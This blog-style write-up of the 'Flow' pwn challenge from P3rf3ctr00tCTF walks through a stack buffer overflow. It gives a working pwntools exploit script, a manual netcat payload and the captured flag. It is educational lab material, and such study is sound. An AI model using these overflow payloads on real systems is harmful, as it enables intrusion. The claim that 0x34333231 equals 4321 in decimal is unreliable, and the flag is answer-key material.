---
title: "Flow"
summary: "P3rf3ctr00tCTF pwn chalenge"
categories: ["P3rf3ctr00tCTF","Blog",]
tags: ["P3rf3ctr00tCTF","pwn"]
#externalUrl: ""
#showSummary: true
date: 2024-11-23
draft: false
---


# **Challenge Description**

- **Name:** Flow
- **Category:** pwn
- **Points:** 100
- **Challenge Description:**  
    Be like water

---

# file analysis
First I started by checking the file type using `file` command
```shell
flow: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=22e8e3a51853e485e3a36c1d5f95446782c30fee, for GNU/Linux 3.2.0, not stripped
```
From the output, the file is an ELF 64-bit, dynamically linked, and not stripped. It is built for the x86-64 architecture. Next, I executed the binary to observe its behavior.
# File execution
Upon execution, the binary prompts for user input and exits without any notable action after supplying dummy text. This behavior suggests hidden functionality, so I disassembled the binary using **Ghidra**. The disassembly revealed three key functions: `main`, `vulnerable`, and `win`.
![functions](https://gist.github.com/user-attachments/assets/656998d0-496a-44ab-9219-4e1a8f4cc1de)

The `main` function calls the `vulnerable()` function, which can call the `win()` function if specific conditions are met.
## Vulnerable()
The `vulnerable()` function accepts user input stored in a 60-byte buffer. It does not validate the input size, leaving it susceptible to buffer overflow.
![vulnerable_function](https://gist.github.com/user-attachments/assets/454f12de-e79e-48a7-90e8-f5c390393184)

Within this function:

- A variable `local_c` is initialized to `0xc` (12 in decimal).
- The program compares `local_c` to `0x34333231` (hexadecimal for "1234" in ASCII, or 4321 in decimal).

Under normal execution, this condition is never satisfied because `local_c` is initially set to `12`. However, exploiting the buffer overflow allows us to overwrite `local_c` with the target value (`0x34333231`), triggering the `win()` function.
 
 ## win()
 I proceeded to analyse the win function.
![win_function](https://gist.github.com/user-attachments/assets/9f30ad57-b5a4-44e5-95e3-1eb457ac03d6)

The `win()` function reads the contents of `flag.txt` and prints it to the screen. If the file is missing, an error message is displayed.
## Exploitation
To retrieve the flag, we need to:

1. Overflow the buffer.
2. Overwrite `local_c` with the value `0x34333231` (corresponding to the ASCII string "1234").
### using pwntools
Here’s the Python script for the exploit using **pwntools**:
```python
from pwn import *

def main():
    host = "94.72.112.248"
    port = 7001

    offset = 60
    target_value = 0x34333231  # Value to overwrite `local_c` ("1234" in ASCII)

    # Payload
    payload = b"A" * offset + p32(target_value)

    try:
        conn = remote(host, port)
      
        conn.sendline(payload)

        response = conn.recvall()
        print(f"[+] Response:\n{response.decode().strip()}")

        conn.close()
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()

```

Running the script successfully retrieves the flag:

```bash
└─$ python3 sol.py 
[+] Opening connection to 94.72.112.248 on port 7001: Done
[+] Receiving all data: Done (72B)
[*] Closed connection to 94.72.112.248 port 7001
[+] Response:
Enter a text please: Your flag is - r00t{fl0w_0f_c0ntr0l_3ngag3d_7391}

```
### Manual exploitation
To exploit manually:

1. Use `pwn cyclic 60` to generate a 60-character pattern.
2. Append `"1234"` to create the payload:
```shell
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa1234
```

3. Send the payload to the server:
 ```bash
└─$ nc 94.72.112.248 7001               
Enter a text please: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa1234
Your flag is - r00t{fl0w_0f_c0ntr0l_3ngag3d_7391}

```

# Flag

The retrieved flag is:

`r00t{fl0w_0f_c0ntr0l_3ngag3d_7391}`

> [!NOTE]
> In the vulnerable program, the variable `local_c` is compared against the value `0x34333231`. This is the **hexadecimal representation** of the ASCII string `"1234"`. When overwriting memory, the bytes are written in **little-endian format** because the system uses the x86-64 architecture, which is little-endian by default.
> 
> In little-endian systems:
> 
> - The least significant byte (LSB) is stored first in memory.
> - For `0x34333231`, the bytes are stored as:    
> ```
> 31 32 33 34
> ```
> which corresponds to the ASCII characters:    
> ```
> "1" "2" "3" "4"
> ```
> 
> Thus, to overwrite `local_c` with `0x34333231`, the payload must contain `"1234"` in the correct byte order. If we naively sent `"4321"`, the bytes would be stored in reverse order (`0x31323334`), which would fail to meet the condition.

